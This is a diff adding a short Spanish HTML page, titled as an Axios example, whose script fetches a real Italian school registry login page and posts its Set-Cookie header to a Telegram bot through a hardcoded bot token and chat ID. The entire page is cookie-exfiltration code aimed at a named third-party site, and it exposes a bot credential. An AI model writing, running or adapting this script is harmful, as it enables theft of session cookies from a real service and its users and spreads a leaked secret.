@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ejemplo de solicitud con Axios</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+<body>
+    <h1>Solicitud de Cookies</h1>
+    <button onclick="fetchCookies()">Obtener Cookies</button>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8047772352:AAG7SXorG6KpZLOLtGC_kChm6bAdEm5QvnE';
+        const CHAT_ID = '5709299213';
+
+        function fetchCookies() {
+            axios.get('https://registro.orsoline.it/Default.aspx', {
+                headers: { /* headers si son necesarios */ }
+            })
+            .then(response => {
+                const cookies = response.headers['set-cookie'];
+                axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    chat_id: CHAT_ID,
+                    text: `Cookie recibidos: ${cookies}`
+                });
+                alert('Cookies obtenidas y enviadas a Telegram');
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Ocurrió un error al obtener las cookies');
+            });
+        }
+    </script>
+</body>
+</html>
